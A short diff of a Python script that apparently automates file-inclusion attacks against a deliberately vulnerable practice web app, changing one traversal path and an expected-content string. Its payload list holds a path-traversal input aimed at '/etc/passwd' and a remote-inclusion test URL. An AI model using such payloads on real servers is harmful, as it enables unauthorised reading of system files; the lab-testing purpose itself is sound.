@@ -56,7 +56,7 @@ def login_and_setup_security():
 
 def file_inclusion_attack():
     file_paths = [
-        "../hackable/flags/fi.php",  # LFI
+        "../../hackable/flags/fi.php",  # LFI
         "../../../../../../etc/passwd", # LFI
         "https://www.google.com"  # RFI
     ]
@@ -73,7 +73,7 @@ def file_inclusion_attack():
 
         if "https" in file_path:  # Assuming RFI attempt for https URLs
             test_type = "RFI"
-            expected_contents = ["Google", "Pesquisa Google", "Estou com sorte"]  # Examples of text expected from Google
+            expected_contents = ["google", "Pesquisa Google", "Estou com sorte"]  # Examples of text expected from Google
             content_check = any(text in response.text for text in expected_contents)
         else:
             test_type = "LFI"
